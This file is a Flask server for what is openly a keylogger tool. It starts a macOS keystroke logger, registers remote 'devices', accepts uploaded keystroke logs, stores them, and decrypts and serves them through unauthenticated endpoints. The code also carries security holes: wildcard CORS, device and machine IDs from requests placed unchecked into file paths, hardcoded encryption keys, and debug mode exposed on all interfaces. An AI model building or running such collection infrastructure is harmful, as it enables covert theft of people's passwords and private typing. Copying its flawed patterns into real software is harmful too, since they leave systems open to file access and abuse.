from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from src.encryption.encryptor import Encryptor
from src.keylogger.mac_keylogger import MacKeyLogger
from src.writers.file_writer import FileWriter
from src.keylogger.manager import KeyLoggerManager
import time
import os
import uuid
from typing import Set
from datetime import datetime
import json

app = Flask(__name__, 
    template_folder='templates',
    static_folder='static'
)

# Update CORS configuration
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type"]
    }
})

# Constants
DATA_FOLDER = "logs"
DATA_DIR = os.path.join(os.path.dirname(__file__), 'backend', 'data')
os.makedirs(DATA_DIR, exist_ok=True)  # Create data directory if it doesn't exist

# Initialize components
keylogger = MacKeyLogger()
writer = FileWriter(
    encryption_key="your_secret_key",
    base_path=DATA_DIR
)
manager = KeyLoggerManager(keylogger, writer)

# Initialize active devices set
active_devices = {}
app.active_devices = active_devices

# Initialize encryption
encryptor = Encryptor(os.getenv('ENCRYPTION_KEY', 'default_key'))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_logging():
    try:
        data = request.get_json()
        selected_os = data.get('os', 'macos')  # Default to macos if not specified
        
        if selected_os == 'macos':
            if not hasattr(app, 'keylogger'):
                app.keylogger = MacKeyLogger()
                app.writer = FileWriter(encryption_key="your_secret_key")
                app.manager = KeyLoggerManager(app.keylogger, app.writer)
            
            app.manager.start()
            return jsonify({
                "status": "success", 
                "message": f"MacOS keylogger started"
            }), 200
            
        elif selected_os == 'windows':
            return jsonify({
                "status": "error",
                "message": "Windows keylogger not implemented yet"
            }), 501
            
        elif selected_os == 'linux':
            return jsonify({
                "status": "error",
                "message": "Linux keylogger not implemented yet"
            }), 501
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/stop', methods=['POST'])
def stop_logging():
    try:
        if hasattr(app, 'manager'):
            app.manager.stop()
            return jsonify({
                "status": "success",
                "message": "Keylogger stopped"
            }), 200
        return jsonify({
            "status": "error",
            "message": "No active keylogger"
        }), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/status', methods=['GET'])
def get_status():
    return jsonify({
        "status": "running" if hasattr(app, 'manager') and app.manager.running else "stopped",
        "os": "MacOS" if hasattr(app, 'keylogger') else "Unknown"
    }), 200

@app.route('/devices', methods=['GET'])
def get_devices():
    try:
        devices = []
        for device_id, device in active_devices.items():
            devices.append({
                'id': device_id,
                'name': f"Device_{device_id[:8]}",
                'status': device.get('status', 'inactive'),
                'osType': device.get('osType', 'unknown')
            })
        return jsonify({
            'status': 'success',
            'devices': devices
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    try:
        logs_file = os.path.join(DATA_DIR, f"{device_id}_logs.txt")
        if not os.path.exists(logs_file):
            return jsonify({
                'status': 'success',
                'logs': ''
            })
            
        with open(logs_file, 'r') as f:
            logs = f.read()
            
        return jsonify({
            'status': 'success',
            'logs': logs
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/logs/decrypted/<device_id>', methods=['GET'])
def get_decrypted_logs(device_id):
    try:
        if hasattr(app, 'device_id') and app.device_id == device_id:
            log_path = os.path.join('backend', 'data', f"keylog_{time.strftime('%Y-%m-%d')}.txt")
            if os.path.exists(log_path):
                decrypted_logs = []
                with open(log_path, 'r') as f:
                    for line in f:
                        if line.startswith('ENC:'):
                            # Get the hex data after the marker
                            hex_data = line[4:].strip()
                            # Convert hex to bytes and decrypt
                            encrypted_data = bytes.fromhex(hex_data)
                            decrypted = writer.encryptor.decrypt(encrypted_data)
                            decrypted_logs.append(decrypted)
                        
                return jsonify({"logs": ''.join(decrypted_logs)}), 200
            return jsonify({"logs": "No logs available"}), 200
        return jsonify({"error": "Device not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def generate_log_file_name():
    return "Log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid request"}), 400
    
    machine = data["machine"]
    log_data = data["data"]
    
    # Creating a file for machine if it doesn't exist
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)
        
    # Creating new file based on current timestamp
    file_name = generate_log_file_name()
    file_path = os.path.join(machine_folder, file_name)
    
    # Writing data to the file
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)
        
    return jsonify({"message": "Data uploaded successfully"}), 200

@app.route('/history', methods=['GET'])
def get_history():
    try:
        history = []
        history_dir = os.path.join(DATA_DIR, 'history')
        os.makedirs(history_dir, exist_ok=True)
        
        # Read all history files
        for filename in os.listdir(history_dir):
            if filename.endswith('.json'):
                with open(os.path.join(history_dir, filename), 'r') as f:
                    entry = json.load(f)
                    history.append(entry)
        
        # Sort by date, newest first
        history.sort(key=lambda x: x['date'], reverse=True)
        
        return jsonify({
            'status': 'success',
            'history': history
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/deactivate', methods=['POST'])
def deactivate_device():
    try:
        data = request.json
        device_id = data.get('deviceId')
        
        if not device_id:
            raise ValueError("Device ID is required")
            
        if device_id not in active_devices:
            raise ValueError("Device not found")
            
        # Stop logging if active
        if active_devices[device_id].get('status') == 'active':
            # Add any cleanup needed here
            pass
            
        # Remove device from active devices
        del active_devices[device_id]
        
        return jsonify({
            'status': 'success',
            'message': 'Device deactivated successfully'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 404

@app.route('/connect', methods=['POST'])
def connect_device():
    try:
        data = request.json
        os_type = data.get('osType')
        
        if not os_type:
            raise ValueError("OS type is required")
            
        # Generate device ID
        device_id = f"{os_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Store device info
        active_devices[device_id] = {
            'osType': os_type,
            'status': 'connected',
            'startTime': datetime.now().isoformat()
        }
        
        return jsonify({
            'status': 'success',
            'deviceId': device_id
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/logs/upload', methods=['POST'])
def upload_logs():
    try:
        data = request.json
        device_id = data.get('deviceId')
        log_data = data.get('data')
        timestamp = data.get('timestamp')
        
        if not all([device_id, log_data, timestamp]):
            raise ValueError("Missing required data")
            
        # Save to device logs
        logs_file = os.path.join(DATA_DIR, f"{device_id}_logs.txt")
        with open(logs_file, 'a') as f:
            f.write(f"[{timestamp}] {log_data}\n")
            
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
    